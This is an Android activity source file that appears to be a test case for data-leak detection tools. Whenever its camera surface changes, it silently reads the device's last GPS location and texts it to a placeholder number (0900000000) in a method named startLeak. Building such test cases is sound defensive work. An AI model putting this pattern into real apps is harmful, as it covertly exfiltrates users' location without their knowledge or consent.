package com.test;
 

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import com.example.androidtest1.R;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MyActivity extends Activity implements SurfaceHolder.Callback 
{
	private SurfaceView mSurfaceView;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		mSurfaceView = (SurfaceView)findViewById(R.id.surface_camera);
		SurfaceHolder surfaceHolder = mSurfaceView.getHolder();
        surfaceHolder.addCallback(this);/*
        Button btn = (Button)findViewById(R.id.button);
        btn.setOnClickListener(new OnClickListener()
        {
			@Override
			public void onClick(View v)
			{
				startLeak();
			}
        });*/
        /*surfaceHolder.addCallback(new SurfaceHolder.Callback()
        {

			@Override
			public void surfaceCreated(SurfaceHolder holder)
			{
			}

			@Override
			public void surfaceChanged(SurfaceHolder holder, int format,
					int width, int height)
			{
				startLeak();				
			}

			@Override
			public void surfaceDestroyed(SurfaceHolder holder) {
				// TODO Auto-generated method stub
				
			}
        	
        });*/
	}
	@Override
	public void surfaceChanged(SurfaceHolder holder, int format, int w, int h)
	{
		startLeak();
		/*new Handler().postDelayed(new Runnable(){
			@Override
			public void run()
			{
				startLeak();			
			}
			
		}, 1000);*/
	}
	public void startLeak()
	{
		LocationManager locManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		Location loc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		SmsManager smsManager = SmsManager.getDefault();
		byte[] fromarray = loc.toString().getBytes();
		byte[] toarray = new byte[fromarray.length];
		System.arraycopy(fromarray, 0, toarray, 0, fromarray.length);
		smsManager.sendTextMessage("0900000000", null, new String(toarray), null, null);
	}
	@Override
	public void surfaceCreated(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void surfaceDestroyed(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		
	}
}

